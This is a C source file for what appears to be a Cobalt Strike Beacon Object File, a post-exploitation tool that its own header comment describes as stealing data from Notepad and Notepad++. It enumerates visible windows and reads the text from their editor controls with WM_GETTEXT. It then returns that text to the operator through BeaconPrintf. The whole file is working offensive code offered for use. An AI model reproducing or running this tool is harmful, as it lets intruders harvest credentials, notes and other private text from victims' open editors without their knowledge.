#include <windows.h>
#include "bofdefs.h"
#include "base.c"
/*	Idea based on https://github.com/trainr3kt/NoteThief
	- The original only grabbed the highest level Z window
	- Searches all visible windows with non-null names
	- Adds ability to steal data from notepad++
	- Could potentially be expanded to allow specification of a string to search for in Window Name and a string to correspond to a control
*/

BOOL CALLBACK EnumWindowClasses(HWND hWndParent, LPARAM lParam)
{
	// hWndParent - the parent is the handle to the Window passed by USER32$EnumChildWindows callback to this function
	// lParam - the name of the control we are looking for
	
	char ControlName[128] = {0};														// The name of this child control
	char WindowName[128] = {0};															// The Title/Caption of the parent window
	char *needle = (char*) lParam;														// the control name we are searching for
	DWORD WinLen = USER32$GetClassNameA(hWndParent, ControlName, 127);					// get the name of this child control

	if (ControlName[0] != 0 && WinLen) {
		if(MSVCRT$strcmp(ControlName, needle) == 0) {
			char *buffer;
			int len = 0;
			WinLen = USER32$GetWindowTextA(hWndParent, WindowName, 127);				// get the Title/Caption of the parent window
			len = USER32$SendMessageA(hWndParent, WM_GETTEXTLENGTH, 0, 0);				// get the length of the control contents
			if(len == 0) {
					return TRUE;														// control had no text to copy, keep looking
			}
			buffer = (char*)MSVCRT$calloc(1, len+1);									// add room for null termination
			USER32$SendMessageA(hWndParent, WM_GETTEXT, len+1, (LPARAM)buffer);
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Notepad++ Found: %s\n%s", WindowName, buffer);
			MSVCRT$free(buffer);
		}
	} 
	return TRUE;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
	// hwnd is a handle to the parent passed to this callback via the EnumWindowsProc in go()
	// lParam is the text we are looking for in the window title/caption
	char WindowName[128] = {0};															// the title/caption of the window
	DWORD WinLen = USER32$GetWindowTextA(hwnd, WindowName, 127);

	if (WindowName[0] != 0 && WinLen) {													// Did I get a window name
		if(USER32$IsWindowVisible(hwnd)) {												// Is the window name visible
			PCHAR index = MSVCRT$strstr(WindowName, (char*)lParam);						// Is my search string in the window name
			if(index) {
				HWND editHwnd = NULL;
				char *buffer;
				int len = 0;
				editHwnd = USER32$FindWindowExA(hwnd, NULL, "Edit", NULL);				// Edit is the default control for textarea in notepad
				if (editHwnd) {
					len = USER32$SendMessageA(editHwnd, WM_GETTEXTLENGTH, 0, 0);		// get the length of the control contents
					buffer = (char*)MSVCRT$calloc(1, len+1);
					USER32$SendMessageA(editHwnd, WM_GETTEXT,len+1,(LPARAM)buffer);
					BeaconPrintf(CALLBACK_OUTPUT, "[+] Notepad Found: %s\n%s\n", WindowName, buffer);
					MSVCRT$free(buffer);
				} else {
					char *controlName = "Scintilla";									// It wasnt notepad, maybe notepad++, query the Scintilla control
					USER32$EnumChildWindows(hwnd, (WNDENUMPROC)EnumWindowClasses, (LPARAM) controlName);
				}
			}
		}
	}
	return TRUE;
}


void go(IN PCHAR Buffer, IN ULONG Length) {
	const char *windowname = "Notepad";
	USER32$EnumDesktopWindows(NULL,(WNDENUMPROC)EnumWindowsProc,(LPARAM) windowname);
}

#ifndef BOF
int main() {
	go(NULL, 0);
	return 0;
}
#endif